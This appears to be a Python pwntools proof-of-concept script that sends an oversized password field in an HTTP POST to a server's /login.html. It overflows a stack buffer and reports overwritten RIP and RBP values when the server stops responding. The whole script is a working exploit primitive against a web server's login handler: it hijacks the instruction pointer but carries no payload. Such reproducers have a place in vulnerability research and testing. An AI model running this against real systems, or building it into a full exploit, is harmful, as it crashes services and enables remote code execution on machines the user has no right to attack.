from pwn import *
import signal
import sys
import os

def handler(signum, frame):
    sys.exit(0)

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)

    s = remote(HOST, PORT)

    data = b'POST /login.html HTTP/1.1\r\n'
    data += b'Accept: */*\r\n'
    data += b'Content-Length: 192\r\n'
    data += b'Content-Type: application/x-www-form-urlencoded\r\n\r\n'
    data += b'user=chess&pass='
    data += b'a'*160 + b'b'*8 + b'c'*8
	
    s.send(data)

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(2)

    try:
        s.recvuntil(b'</a>.\r\n')
    except:
        print('RIP=0x6363636363636363')
        print('RBP=0x6262626262626262')
        s.close()
        sys.exit(0)

    s.close()

    print('[FAIL] The recv succeeded so this likely failed')
    sys.exit(1)

if __name__=='__main__':
    main()
